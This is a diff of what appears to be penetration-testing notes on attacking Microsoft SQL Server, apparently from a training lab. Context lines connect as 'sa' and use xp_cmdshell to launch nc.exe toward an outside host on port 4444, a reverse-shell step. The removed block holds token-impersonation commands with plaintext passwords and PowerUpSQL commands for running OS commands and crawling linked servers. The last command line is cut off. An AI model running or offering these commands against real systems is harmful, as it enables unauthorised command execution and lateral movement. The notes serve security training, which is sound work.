@@ -36,16 +36,3 @@ python mssqlclient.py sa:123456@192.168.100.120
 > EXEC master.dbo.xp_cmdshell 'nc.exe -nv 192.168.100.104 4444';
 ```
 
-### 
-```
-make_token dev.zeropointsecurity.co.uk\bridgesb Scorpion!
-make_token cyberbotic.io\svc_mssql Cyberb0tic
-powershell Get-SQLQuery -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version'
-powershell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command 'dir C:\' -RawResults 
-powershell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command 'dir C:\Users\svc_mssql\Desktop' -RawResults 
-
-powerShell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433'
-powershell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version' | select Instance, CustomQuery
-powershelll Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version' | select Instance, CustomQuery | % { $_ | Add-Member NoteProperty 'QueryResult' $($_.CustomQuery[0]); $_ } | f
-111
-
